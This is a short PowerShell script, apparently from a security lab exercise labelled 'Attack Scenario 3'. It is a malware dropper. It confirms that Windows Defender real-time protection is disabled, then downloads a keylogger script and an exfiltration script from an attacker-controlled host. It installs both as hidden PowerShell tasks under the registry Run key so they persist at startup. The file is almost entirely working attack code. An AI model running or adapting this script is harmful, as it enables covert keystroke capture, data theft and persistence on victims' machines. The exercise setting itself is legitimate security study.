# This script is part of Attack Scenario 3:
# It first verifies that Windows Defender's RealTime Protection is disabled before downloading two files (Keylogger.ps1 and Exfil.ps1) hosted by our attacker machine
# Both files are added to CurrentVersion Run of the Windows Registry so they run at machine startup

# Verify that RealTimeProtection is disabled before continuing
if (Get-MPComputerStatus | where-object {$_.RealTimeProtectionEnabled -like 'False'}) {
	
	# Create the directory where files will be stored before exfiltration
	mkdir C:\Windows\Temp\exfil
	
	# Download the two PowerShell files hosted by our attacker machine
	Invoke-WebRequest -URI http://[ip]:[port]/Keylogger.ps1 -OutFile C:\Windows\Temp\Keylogger.ps1;
	Invoke-WebRequest -URI http://[ip]:[port]/Exfil.ps1 -OutFile C:\Windows\Temp\Exfil.ps1;

	# Add key-value pairs to the Windows Registry so the scripts run at machine startup
	REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "KeyLogger" /t REG_SZ /F /D "powershell.exe -WindowStyle hidden -file C:\Windows\Temp\Keylogger.ps1";
	REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Exfil" /t REG_SZ /F /D "powershell.exe -WindowStyle hidden -file C:\Windows\Temp\Exfil.ps1";
}
